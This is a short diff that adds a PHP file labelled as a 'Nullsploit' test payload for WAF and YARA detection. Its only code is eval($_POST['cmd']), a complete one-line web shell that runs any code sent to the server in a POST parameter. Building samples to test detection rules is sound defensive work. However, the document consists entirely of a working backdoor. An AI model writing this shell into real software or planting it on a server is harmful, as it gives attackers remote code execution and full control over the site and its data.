@@ -1,0 +1,4 @@
+<?php
+// Nullsploit WAF YARA Testing Payload
+eval($_POST['cmd']);
+?>
